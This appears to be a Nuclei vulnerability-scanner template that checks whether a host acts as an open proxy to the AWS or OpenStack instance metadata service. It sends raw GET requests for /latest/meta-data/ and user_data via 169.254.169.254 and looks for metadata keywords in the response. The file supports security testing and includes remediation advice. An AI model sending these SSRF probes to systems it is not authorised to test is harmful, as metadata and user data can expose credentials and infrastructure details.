http:
- attack: clusterbomb
  matchers:
  - condition: or
    part: body
    type: word
    words:
    - public-ipv4
    - privateIp
    - HOSTNAME
    - '#!/bin/bash'
  matchers-condition: and
  payloads:
    hostval:
    - aws.oast.online
    - 169.254.169.254
  raw:
  - 'GET http://{{hostval}}/latest/meta-data/ HTTP/1.1

    Host: {{hostval}}


    '
  - 'GET http://{{hostval}}/openstack/latest/user_data/ HTTP/1.1

    Host: {{hostval}}


    '
  stop-at-first-match: true
  unsafe: true
id: metadata-aws
info:
  author: sullo
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
    cvss-score: 9.3
    cwe-id: CWE-441
  description: The AWS host is configured as a proxy which allows access to the metadata
    service. This could allow significant access to the host/infrastructure.
  metadata:
    max-request: 4
  name: Amazon AWS Metadata Service Check
  reference:
  - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
  - https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
  - https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/
  remediation: Disable the proxy or restrict configuration to only allow access to
    approved hosts/ports. Upgrade to IMDSv2 if possible.
  severity: critical
  tags: cloud,ssrf
